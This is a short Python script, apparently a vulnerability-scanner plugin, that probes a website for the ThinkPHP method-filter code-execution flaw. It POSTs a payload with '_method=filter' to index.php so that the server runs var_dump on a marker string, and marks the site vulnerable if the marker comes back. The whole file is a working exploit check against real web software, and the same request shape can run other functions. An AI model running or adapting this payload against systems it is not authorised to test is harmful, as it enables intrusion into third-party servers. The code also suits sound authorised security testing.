import urllib
import requests


def verify(url):
    relsult = {
        'name': 'thinkphp_method_filter_code_exec',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payload = {
        'c':'var_dump',
        'f':'4e5e5d7364f443e28fbf0d3ae744a59a',
        '_method':'filter',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vurl
            relsult['position'] = 'data'
            relsult['payload'] = payload
        return relsult

    except:
        return relsult
